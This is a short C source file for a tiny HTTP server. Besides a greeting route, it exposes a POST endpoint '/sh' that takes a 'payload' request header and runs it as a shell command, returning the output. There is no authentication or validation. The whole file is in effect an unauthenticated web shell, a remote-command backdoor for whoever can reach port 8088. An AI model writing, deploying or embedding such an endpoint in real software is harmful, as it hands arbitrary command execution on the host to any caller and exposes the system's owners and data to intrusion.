#include "httpd.h"
#include <stdlib.h>

extern int runCmd(char *p_cmd, int *p_exitcode, char **pp_stdout, 
        int *p_stdout_size, char **pp_stderr, int *p_stderr_size);

int main(int c, char **v)
{
    serve_forever("8088");
    return 0;
}

void route()
{
    ROUTE_START()

    ROUTE_GET("/")
    {
        printf("HTTP/1.1 200 OK\r\n\r\n");
        printf("Hello! You are using %s", request_header("User-Agent"));
    }

    ROUTE_POST("/")
    {
        printf("HTTP/1.1 200 OK\r\n\r\n");
    }

    ROUTE_POST("/sh")
    {
        printf("HTTP/1.1 200 OK\r\n\r\n");
        const char *shell = request_header("payload");
        if (shell != NULL)
        {
            int exitcode;
            char *p_stdout = NULL;
            char *p_stderr = NULL;
            int stdout_size = 0;
            int stderr_size = 0;
            char runShell[512] = {'\0'};
            snprintf(runShell, 512, "%s 2>&1\n", shell);
            int rc = runCmd(runShell, &exitcode, &p_stdout, &stdout_size, &p_stderr,
                              &stderr_size);
            printf("run %s %s\n%s\n", shell, exitcode == 0 ? "ok" : "bad", p_stdout);
            if (p_stdout != NULL)
            {
                free(p_stdout);
            }

            if (p_stderr != NULL)
            {
                free(p_stderr);
            }
        }
    }

    ROUTE_END()
}
